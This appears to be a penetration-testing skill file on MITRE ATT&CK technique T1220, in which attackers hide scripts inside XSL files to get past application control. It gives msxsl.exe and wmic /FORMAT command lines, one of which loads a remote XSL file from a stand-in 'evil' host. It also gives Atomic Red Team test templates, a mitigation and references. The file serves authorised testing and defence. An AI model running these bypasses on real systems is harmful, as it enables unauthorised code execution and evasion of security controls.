---
name: "T1220_xsl-script-processing"
description: "Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1220
  - defense-evasion
  - windows
technique_id: "T1220"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1220"
tech_stack:
  - windows
cwe_ids:
  - CWE-693
chains_with:
  []
prerequisites:
  []
severity_boost: {}
---

# T1220 XSL Script Processing

## High-Level Description

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. 

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to Trusted Developer Utilities Proxy Execution, the Microsoft common line transformation utility binary (msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.

Command-line examples:

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using Windows Management Instrumentation to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its Regsvr32/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in Windows Management Instrumentation provided they utilize the /FORMAT switch.

Command-line examples:

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** Windows

## What to Check

- [ ] Identify if XSL Script Processing technique is applicable to target environment
- [ ] Check Windows systems for indicators of XSL Script Processing
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: MSXSL Bypass using local files

Executes the code specified within a XSL script tag during XSL transformation using a local payload. 
Requires download of MSXSL. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 ) 
Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** windows

```cmd
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
```

**Dependencies:**
- XML file must exist on disk at specified location (#{xmlfile})
- XSL file must exist on disk at specified location (#{xslfile})
- msxsl.exe must exist on disk at specified location (#{msxsl_exe})

### Atomic Test 2: MSXSL Bypass using remote files

Executes the code specified within a XSL script tag during XSL transformation using a remote payload.
Requires download of MSXSL.exe. No longer available from Microsoft.
(Available via Internet Archive https://web.archive.org/web/20200825011623/https://www.microsoft.com/en-us/download/details.aspx?id=21714 )
Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** windows

```cmd
"#{msxsl_exe}" "#{xmlfile}" "#{xslfile}"
```

**Dependencies:**
- msxsl.exe must exist on disk at specified location ("#{msxsl_exe}")

### Atomic Test 3: WMIC bypass using local XSL file

Executes the code specified within a XSL script using a local payload.

**Supported Platforms:** windows

```cmd
wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
```

**Dependencies:**
- XSL file must exist on disk at specified location (#{local_xsl_file})

### Atomic Test 4: WMIC bypass using remote XSL file

Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test successfully executed, while AV turned off.

**Supported Platforms:** windows

```cmd
wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to XSL Script Processing by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1220 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention
If msxsl.exe is unnecessary, then block its execution to prevent abuse by adversaries.


## Detection

### Detect XSL Script Abuse via msxsl and wmic


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| XSL Script Processing technique applicable | High | Defense Evasion |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-693 | Protection Mechanism Failure |


## References

- [Reaqta MSXSL Spearphishing MAR 2018](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)
- [Twitter SquiblyTwo Detection APR 2018](https://x.com/dez_/status/986614411711442944)
- [LOLBAS Wmic](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
- [Microsoft msxsl.exe](https://www.microsoft.com/download/details.aspx?id=21714)
- [Penetration Testing Lab MSXSL July 2017](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)
- [XSL Bypass Mar 2019](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)
- [Microsoft XSLT Script Mar 2017](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)
- [Atomic Red Team - T1220](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1220)
- [MITRE ATT&CK - T1220](https://attack.mitre.org/techniques/T1220)
